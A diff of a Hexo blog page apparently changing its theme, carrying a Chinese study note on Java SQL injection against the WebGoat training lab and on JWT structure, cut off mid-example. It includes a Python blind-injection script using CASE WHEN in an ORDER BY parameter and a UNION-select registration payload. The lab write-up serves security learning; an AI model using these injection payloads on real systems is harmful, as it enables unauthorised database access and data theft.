@@ -1,703 +1,615 @@
-
-
 <!DOCTYPE html>
-<html lang="zh-CN" data-default-color-scheme=auto>
+<html lang="zh-CN" color-mode="light">
 
-
-
-<head>
-  <meta charset="UTF-8">
-  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
-  <link rel="icon" href="/img/ico.jpg">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
-  <meta http-equiv="x-ua-compatible" content="ie=edge">
-  
-  <meta name="theme-color" content="#2f4154">
-  <meta name="author" content="F4tty">
-  <meta name="keywords" content="">
-  
-    <meta name="description" content="JAVA安全之JWT安全及预编译CASE注入学习笔记">
-<meta property="og:type" content="article">
-<meta property="og:title" content="JAVA安全-JWT安全及预编译 CASE 注入">
-<meta property="og:url" content="http://example.com/posts/43f09137/index.html">
-<meta property="og:site_name" content="F4tty">
-<meta property="og:description" content="JAVA安全之JWT安全及预编译CASE注入学习笔记">
-<meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://example.com/posts/43f09137/image-20220204205002145.png">
-<meta property="og:image" content="http://example.com/posts/43f09137/image-20220204205222142.png">
-<meta property="og:image" content="http://example.com/posts/43f09137/image-20220204210343988.png">
-<meta property="og:image" content="http://example.com/posts/43f09137/image-20220204211625244.png">
-<meta property="og:image" content="http://example.com/posts/43f09137/image-20220205224641299.png">
-<meta property="og:image" content="http://example.com/posts/43f09137/image-20220205110312210.png">
-<meta property="og:image" content="http://example.com/posts/43f09137/image-20220205111357736.png">
-<meta property="og:image" content="http://example.com/posts/43f09137/image-20220205111928593.png">
-<meta property="og:image" content="http://example.com/posts/43f09137/image-20220205112844469.png">
-<meta property="og:image" content="http://example.com/posts/43f09137/image-20220205112926183.png">
-<meta property="og:image" content="http://example.com/posts/43f09137/image-20220205112938904.png">
-<meta property="og:image" content="http://example.com/posts/43f09137/image-20220205113051705.png">
-<meta property="og:image" content="http://example.com/posts/43f09137/image-20220205113106249.png">
-<meta property="og:image" content="http://example.com/posts/43f09137/image-20220205114647600.png">
-<meta property="og:image" content="http://example.com/posts/43f09137/image-20220205120229198.png">
-<meta property="og:image" content="http://example.com/posts/43f09137/image-20220205120509791.png">
-<meta property="og:image" content="http://example.com/posts/43f09137/image-20220205171436379.png">
-<meta property="og:image" content="http://example.com/posts/43f09137/image-20220205185622947.png">
-<meta property="og:image" content="http://example.com/posts/43f09137/image-20220205185819944.png">
-<meta property="og:image" content="http://example.com/posts/43f09137/image-20220205205823502.png">
-<meta property="og:image" content="http://example.com/posts/43f09137/image-20220205214813724-16440688965541.png">
-<meta property="og:image" content="http://example.com/posts/43f09137/image-20220205214855195-16440689380832.png">
-<meta property="og:image" content="http://example.com/posts/43f09137/image-20220205214912474.png">
-<meta property="og:image" content="http://example.com/posts/43f09137/image-20220205214949819-16440689920343.png">
-<meta property="og:image" content="http://example.com/posts/43f09137/image-20220205215204437.png">
-<meta property="og:image" content="http://example.com/posts/43f09137/image-20220205215938396.png">
-<meta property="og:image" content="http://example.com/posts/43f09137/image-20220205215912616.png">
-<meta property="og:image" content="http://example.com/posts/43f09137/image-20220205215549153.png">
-<meta property="og:image" content="http://example.com/posts/43f09137/image-20220205215817789-16440695032324.png">
-<meta property="article:published_time" content="2022-02-03T16:00:00.000Z">
-<meta property="article:modified_time" content="2022-07-28T14:53:31.017Z">
-<meta property="article:author" content="F4tty">
-<meta property="article:tag" content="JAVA安全">
-<meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="http://example.com/posts/43f09137/image-20220204205002145.png">
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="keywords" content="" />
+  <meta name="author" content="F4tty" />
+  <meta name="description" content="" />
   
   
+  <title>
+    
+      JAVA安全-JWT安全及预编译 CASE 注入 
+      
+      
+      |
+    
+     F4tty
+  </title>
+
   
-  <title>JAVA安全-JWT安全及预编译 CASE 注入 - F4tty</title>
-
-  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
-
-
-
-  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
-
-  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
-
-  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
-
-
-
-<!-- 主题依赖的图标库，不要自行修改 -->
-<!-- Do not modify the link that theme dependent icons -->
-
-<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
-
-
-
-<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
-
-
-<link  rel="stylesheet" href="/css/main.css" />
-
-
-  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
-  
-    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+    <link rel="apple-touch-icon" href="/images/favicon.png">
+    <link rel="icon" href="/img/favicon.ico">
   
 
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  <link rel="stylesheet" href="/css/main.css" />
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
+  <!-- 代码块风格 -->
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="/js/fancybox.js"></script>
 
 
+  
 
-  <script id="fluid-configs">
-    var Fluid = window.Fluid || {};
-    Fluid.ctx = Object.assign({}, Fluid.ctx)
-    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.2","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+  
 
-    if (CONFIG.web_analytics.follow_dnt) {
-      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
-      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
     }
   </script>
-  <script  src="/js/utils.js" ></script>
-  <script  src="/js/color-schema.js" ></script>
-  
-
-
-  
 <meta name="generator" content="Hexo 6.2.0"></head>
 
 
-<body>
-  
-
-  <header>
-    
-
-<div class="header-inner" style="height: 70vh;">
-  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
-  <div class="container">
-    <a class="navbar-brand" href="/">
-      <strong>F4tty&#39;s Note</strong>
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/img/avatar.jpg" alt="">
+      
     </a>
-
-    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
-            data-target="#navbarSupportedContent"
-            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
-      <div class="animated-icon"><span></span><span></span><span></span></div>
-    </button>
-
-    <!-- Collapsible content -->
-    <div class="collapse navbar-collapse" id="navbarSupportedContent">
-      <ul class="navbar-nav ml-auto text-center">
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/">
-                <i class="iconfont icon-home-fill"></i>
-                首页
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/archives/">
-                <i class="iconfont icon-archive-fill"></i>
-                归档
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/categories/">
-                <i class="iconfont icon-category-fill"></i>
-                分类
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/tags/">
-                <i class="iconfont icon-tags-fill"></i>
-                标签
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/about/">
-                <i class="iconfont icon-user-fill"></i>
-                关于
-              </a>
-            </li>
-          
-        
-        
-          <li class="nav-item" id="search-btn">
-            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
-              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
-            </a>
-          </li>
-          
-        
-        
-          <li class="nav-item" id="color-toggle-btn">
-            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
-                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
-          </li>
-        
-      </ul>
-    </div>
+    <div class="nickname"><a href="/">F4tty</a></div>
   </div>
-</nav>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">主页</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">归档</a>
+        </li>
+      
+        <li class="nav-item" data-path="/categories/">
+          <a href="/categories/">分类</a>
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          <a href="/tags/">标签</a>
+        </li>
+      
+        <li class="nav-item" data-path="/friends/">
+          <a href="/friends/">友链</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">关于我</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
 
   
 
-<div id="banner" class="banner" parallax=true
-     style="background: url('/img/indexbg.png') no-repeat center center; background-size: cover;">
-  <div class="full-bg-img">
-    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
-      <div class="banner-text text-center fade-in-up">
-        <div class="h2">
-          
-            <span id="subtitle" data-typed-text="JAVA安全-JWT安全及预编译 CASE 注入"></span>
-          
-        </div>
+  
 
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">JAVA安全-JWT安全及预编译 CASE 注入</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
+          2022-02-04 00:00:00
+        </span>
         
-          
-  <div class="mt-3">
-    
-    
-      <span class="post-meta">
-        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2022-02-04 00:00" pubdate>
-          2022年2月4日 凌晨
-        </time>
-      </span>
-    
-  </div>
-
-  <div class="mt-1">
-    
-      <span class="post-meta mr-2">
-        <i class="iconfont icon-chart"></i>
-        
-          5.4k 字
-        
-      </span>
-    
-
-    
-      <span class="post-meta mr-2">
-        <i class="iconfont icon-clock-fill"></i>
-        
-        
-        
-          45 分钟
-        
-      </span>
-    
-
-    
-    
-  </div>
-
-
-        
-      </div>
-
-      
-    </div>
-  </div>
-</div>
-
-</div>
-
-  </header>
-
-  <main>
-    
-      
-
-<div class="container-fluid nopadding-x">
-  <div class="row nomargin-x">
-    <div class="side-col d-none d-lg-block col-lg-2">
-      
-
-    </div>
-
-    <div class="col-lg-8 nopadding-x-md">
-      <div class="container nopadding-x-md" id="board-ctn">
-        <div id="board">
-          <article class="post-content mx-auto">
-            <!-- SEO header -->
-            <h1 style="display: none">JAVA安全-JWT安全及预编译 CASE 注入</h1>
-            
-            
-              <div class="markdown-body">
+              <span class="post-tags">
+                <i class="iconfont icon-tags mr-10" title="标签"></i>
                 
-                <h1 id="JAVA安全-JWT-安全及预编译-CASE-注入"><a href="#JAVA安全-JWT-安全及预编译-CASE-注入" class="headerlink" title="JAVA安全-JWT 安全及预编译 CASE 注入"></a>JAVA安全-JWT 安全及预编译 CASE 注入</h1><h2 id="JAVA中的sql注入"><a href="#JAVA中的sql注入" class="headerlink" title="JAVA中的sql注入"></a>JAVA中的sql注入</h2><h3 id="SQL-Injection-mitigation"><a href="#SQL-Injection-mitigation" class="headerlink" title="SQL Injection(mitigation)"></a>SQL Injection(mitigation)</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java">防御 sql 注入，其实就是 session，参数绑定，存储过程这样的注入。<br><br><span class="hljs-comment">// 利用 session 防御，session 内容正常情况下是用户无法修改的 select * from users where user = &quot;&#x27;&quot; +</span><br>session.getAttribute(<span class="hljs-string">&quot;UserID&quot;</span>) + <span class="hljs-string">&quot;&#x27;&quot;</span>;<br><br><span class="hljs-comment">// 参数绑定方式，利用了 sql 的预编译技术</span><br><span class="hljs-type">String</span> <span class="hljs-variable">query</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;SELECT * FROM users WHERE last_name = ?&quot;</span>;<br><span class="hljs-type">PreparedStatement</span> <span class="hljs-variable">statement</span> <span class="hljs-operator">=</span> connection.prepareStatement(query);<br>statement.setString(<span class="hljs-number">1</span>, accountName);<br><span class="hljs-type">ResultSet</span> <span class="hljs-variable">results</span> <span class="hljs-operator">=</span> statement.executeQuery();<br><br>上面说的方式也不是能够绝对的进行 sql 注入防御，只是减轻。<br><br>如参数绑定方式可以使用下面方式绕过。<br>通过使用 <span class="hljs-keyword">case</span> when 语句可以将 order by 后的 orderExpression 表达式中添加 select 语句。（前提是必须存在order by）<br></code></pre></td></tr></table></figure>
+                <span class="span--tag mr-8">
+                  <a href="/tags/JAVA%E5%AE%89%E5%85%A8/" title="JAVA安全">
+                    #JAVA安全
+                  </a>
+                </span>
+                
+              </span>
+          
+      </div>
+      <div class="markdown-body">
+        <h1 id="JAVA安全-JWT-安全及预编译-CASE-注入"><a href="#JAVA安全-JWT-安全及预编译-CASE-注入" class="headerlink" title="JAVA安全-JWT 安全及预编译 CASE 注入"></a>JAVA安全-JWT 安全及预编译 CASE 注入</h1><h2 id="JAVA中的sql注入"><a href="#JAVA中的sql注入" class="headerlink" title="JAVA中的sql注入"></a>JAVA中的sql注入</h2><h3 id="SQL-Injection-mitigation"><a href="#SQL-Injection-mitigation" class="headerlink" title="SQL Injection(mitigation)"></a>SQL Injection(mitigation)</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">防御 sql 注入，其实就是 session，参数绑定，存储过程这样的注入。</span><br><span class="line"></span><br><span class="line"><span class="comment">// 利用 session 防御，session 内容正常情况下是用户无法修改的 select * from users where user = &quot;&#x27;&quot; +</span></span><br><span class="line">session.getAttribute(<span class="string">&quot;UserID&quot;</span>) + <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 参数绑定方式，利用了 sql 的预编译技术</span></span><br><span class="line"><span class="type">String</span> <span class="variable">query</span> <span class="operator">=</span> <span class="string">&quot;SELECT * FROM users WHERE last_name = ?&quot;</span>;</span><br><span class="line"><span class="type">PreparedStatement</span> <span class="variable">statement</span> <span class="operator">=</span> connection.prepareStatement(query);</span><br><span class="line">statement.setString(<span class="number">1</span>, accountName);</span><br><span class="line"><span class="type">ResultSet</span> <span class="variable">results</span> <span class="operator">=</span> statement.executeQuery();</span><br><span class="line"></span><br><span class="line">上面说的方式也不是能够绝对的进行 sql 注入防御，只是减轻。</span><br><span class="line"></span><br><span class="line">如参数绑定方式可以使用下面方式绕过。</span><br><span class="line">通过使用 <span class="keyword">case</span> when 语句可以将 order by 后的 orderExpression 表达式中添加 select 语句。（前提是必须存在order by）</span><br></pre></td></tr></table></figure>
 
 <p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/klyjb/p/11473857.html">JDBC编程之预编译SQL与防注入 - 加了冰的才叫可乐 - 博客园 (cnblogs.com)</a></p>
-<h3 id="Javaweb-SQL-注入攻击-预编译机制绕过（WebGoat靶场）"><a href="#Javaweb-SQL-注入攻击-预编译机制绕过（WebGoat靶场）" class="headerlink" title="Javaweb-SQL 注入攻击-预编译机制绕过（WebGoat靶场）"></a>Javaweb-SQL 注入攻击-预编译机制绕过（WebGoat靶场）</h3><p><img src="/posts/43f09137/image-20220204205002145.png" srcset="/img/loading.gif" lazyload alt="image-20220204205002145"></p>
+<h3 id="Javaweb-SQL-注入攻击-预编译机制绕过（WebGoat靶场）"><a href="#Javaweb-SQL-注入攻击-预编译机制绕过（WebGoat靶场）" class="headerlink" title="Javaweb-SQL 注入攻击-预编译机制绕过（WebGoat靶场）"></a>Javaweb-SQL 注入攻击-预编译机制绕过（WebGoat靶场）</h3><p><img src="/posts/43f09137/image-20220204205002145.png" alt="image-20220204205002145"></p>
 <p>点击ip排序</p>
-<p><img src="/posts/43f09137/image-20220204205222142.png" srcset="/img/loading.gif" lazyload alt="image-20220204205222142"></p>
+<p><img src="/posts/43f09137/image-20220204205222142.png" alt="image-20220204205222142"></p>
 <p>将column参数随便改下看下报错</p>
 <p>返回包中发现orderby可以使用case when 绕过</p>
-<p><img src="/posts/43f09137/image-20220204210343988.png" srcset="/img/loading.gif" lazyload alt="image-20220204210343988"></p>
+<p><img src="/posts/43f09137/image-20220204210343988.png" alt="image-20220204210343988"></p>
 <p>使用脚本</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> string <span class="hljs-keyword">import</span> digits<br><br>chars = digits + <span class="hljs-string">&quot;.&quot;</span><br>data1 = <span class="hljs-string">&quot;username_reg=tomx&#x27;+union+select+password+from+sql_challenge_users+where+userid%3D&#x27;teom&#x27;--+-&amp;email_reg=7702%40qq.com&amp;password_reg=123&amp;confirm_password_reg=123&quot;</span><br>headers = &#123;<span class="hljs-string">&#x27;X-Requested-With&#x27;</span>: <span class="hljs-string">&#x27;XMLHttpRequest&#x27;</span>&#125;<br>cookies = &#123;<br>    <span class="hljs-string">&#x27;JSESSIONID&#x27;</span>: <span class="hljs-string">&#x27;lCNtTT1xRD0U-7U8zcjIbyRXzLH_DAvz7jGuMvj0&#x27;</span>,<br>    <span class="hljs-string">&#x27;JSESSIONID.75fbd09e&#x27;</span>: <span class="hljs-string">&#x27;7mc1x9iei6ji4xo2a3u4kbz1&#x27;</span><br>&#125;<br>i = <span class="hljs-number">0</span><br>result = <span class="hljs-string">&quot;&quot;</span><br>proxy = &#123;<span class="hljs-string">&quot;http&quot;</span>: <span class="hljs-string">&quot;http://127.0.0.1:8888&quot;</span>&#125;<br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    i += <span class="hljs-number">1</span><br>    temp = result<br>    <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> chars:<br>        vul_url = <span class="hljs-string">&quot;http://localhost:8080/WebGoat/SqlInjectionMitigations/servers?column=case%20when%20(select%20substr(ip,&#123;0&#125;,1)=&#x27;&#123;1&#125;&#x27;%20from%20servers%20where%20hostname=&#x27;webgoat-prd&#x27;)%20then%20hostname%20else%20mac%20end&quot;</span>.<span class="hljs-built_in">format</span>(i, char)<br>        resp = requests.get(vul_url, headers=headers, cookies=cookies, proxies=proxy)<br>        <span class="hljs-comment"># print(resp.json())</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;webgoat-prd&#x27;</span> <span class="hljs-keyword">in</span> resp.json()[<span class="hljs-number">0</span>][<span class="hljs-string">&#x27;hostname&#x27;</span>]:<br>            result += char<br>            <span class="hljs-built_in">print</span>(result)<br>        	<span class="hljs-keyword">if</span> temp == result:<br>            	<span class="hljs-keyword">break</span><br><br></code></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> digits</span><br><span class="line"></span><br><span class="line">chars = digits + <span class="string">&quot;.&quot;</span></span><br><span class="line">data1 = <span class="string">&quot;username_reg=tomx&#x27;+union+select+password+from+sql_challenge_users+where+userid%3D&#x27;teom&#x27;--+-&amp;email_reg=7702%40qq.com&amp;password_reg=123&amp;confirm_password_reg=123&quot;</span></span><br><span class="line">headers = &#123;<span class="string">&#x27;X-Requested-With&#x27;</span>: <span class="string">&#x27;XMLHttpRequest&#x27;</span>&#125;</span><br><span class="line">cookies = &#123;</span><br><span class="line">    <span class="string">&#x27;JSESSIONID&#x27;</span>: <span class="string">&#x27;lCNtTT1xRD0U-7U8zcjIbyRXzLH_DAvz7jGuMvj0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;JSESSIONID.75fbd09e&#x27;</span>: <span class="string">&#x27;7mc1x9iei6ji4xo2a3u4kbz1&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line">proxy = &#123;<span class="string">&quot;http&quot;</span>: <span class="string">&quot;http://127.0.0.1:8888&quot;</span>&#125;</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line">    temp = result</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> chars:</span><br><span class="line">        vul_url = <span class="string">&quot;http://localhost:8080/WebGoat/SqlInjectionMitigations/servers?column=case%20when%20(select%20substr(ip,&#123;0&#125;,1)=&#x27;&#123;1&#125;&#x27;%20from%20servers%20where%20hostname=&#x27;webgoat-prd&#x27;)%20then%20hostname%20else%20mac%20end&quot;</span>.<span class="built_in">format</span>(i, char)</span><br><span class="line">        resp = requests.get(vul_url, headers=headers, cookies=cookies, proxies=proxy)</span><br><span class="line">        <span class="comment"># print(resp.json())</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;webgoat-prd&#x27;</span> <span class="keyword">in</span> resp.json()[<span class="number">0</span>][<span class="string">&#x27;hostname&#x27;</span>]:</span><br><span class="line">            result += char</span><br><span class="line">            <span class="built_in">print</span>(result)</span><br><span class="line">        	<span class="keyword">if</span> temp == result:</span><br><span class="line">            	<span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<p><img src="/posts/43f09137/image-20220204211625244.png" srcset="/img/loading.gif" lazyload alt="image-20220204211625244"></p>
+<p><img src="/posts/43f09137/image-20220204211625244.png" alt="image-20220204211625244"></p>
 <h2 id="什么是-JWT？"><a href="#什么是-JWT？" class="headerlink" title="什么是 JWT？"></a>什么是 JWT？</h2><blockquote>
 <p>JSON Web Token（JSON Web 令牌）是一种跨域验证身份的方案。JWT 不加密传输的数据，但能够通过数字签名来验证数据未被篡改</p>
 </blockquote>
-<p><img src="/posts/43f09137/image-20220205224641299.png" srcset="/img/loading.gif" lazyload alt="image-20220205224641299"></p>
+<p><img src="/posts/43f09137/image-20220205224641299.png" alt="image-20220205224641299"></p>
 <p>JWT 分为三部分，头部（Header），声明（Claims），签名（Signature），三个部分以英文句号.隔开。JWT 的内容以 Base64URL 进行了编码。签名在base64加密前使用密钥加密</p>
-<p><img src="/posts/43f09137/image-20220205110312210.png" srcset="/img/loading.gif" lazyload alt="image-20220205110312210"></p>
-<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs json">头部（Header）<br><span class="hljs-punctuation">&#123;</span> <br><span class="hljs-attr">&quot;alg&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;HS256&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;typ&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;JWT&quot;</span><br><span class="hljs-punctuation">&#125;</span><br><br>alg是说明这个JWT 的签名使用的算法的参数，常见值用 HS256（默认），HS512 等，也可以为 None。HS256表示 HMAC SHA256。<br>typ说明这个 token 的类型为 JWT<br></code></pre></td></tr></table></figure>
+<p><img src="/posts/43f09137/image-20220205110312210.png" alt="image-20220205110312210"></p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">头部（Header）</span><br><span class="line"><span class="punctuation">&#123;</span> </span><br><span class="line"><span class="attr">&quot;alg&quot;</span><span class="punctuation">:</span><span class="string">&quot;HS256&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;typ&quot;</span><span class="punctuation">:</span><span class="string">&quot;JWT&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line">alg是说明这个JWT 的签名使用的算法的参数，常见值用 HS256（默认），HS512 等，也可以为 None。HS256表示 HMAC SHA256。</span><br><span class="line">typ说明这个 token 的类型为 JWT</span><br></pre></td></tr></table></figure>
 
-<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs json">声明（Claims）<br><span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;exp&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1416471934</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;user_name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;user&quot;</span><span class="hljs-punctuation">,</span> <br><span class="hljs-attr">&quot;scope&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">&quot;read&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-string">&quot;write&quot;</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;authorities&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span> <span class="hljs-string">&quot;ROLE_ADMIN&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-string">&quot;ROLE_USER&quot;</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;jti&quot;</span><span 